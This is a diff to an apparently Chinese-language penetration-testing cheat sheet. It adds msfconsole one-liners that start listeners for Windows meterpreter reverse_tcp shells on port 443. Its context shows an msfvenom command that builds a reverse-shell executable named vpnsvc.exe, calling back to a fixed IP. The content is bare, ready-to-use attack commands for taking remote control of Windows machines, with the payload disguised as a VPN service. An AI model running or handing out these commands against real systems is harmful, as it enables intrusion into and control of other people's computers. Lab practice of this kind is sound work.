@@ -3,6 +3,14 @@
 chcp 65001
 ```
 
+# 快速开启负载
+```
+msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 443;run;"
+
+
+msfconsole -x "use exploit/multi/handler;set payload windows/x64/meterpreter/reverse_tcp;set LHOST tun0;set LPORT 443;run;"
+```
+
 
 # 列出所有攻击载荷
 ```
@@ -21,8 +29,6 @@ exe
 ```
 msfvenom -p windows/shell/reverse_tcp LHOST=192.168.119.131 LPORT=443 -f exe >vpnsvc.exe
 ```
-
-
 
 
 
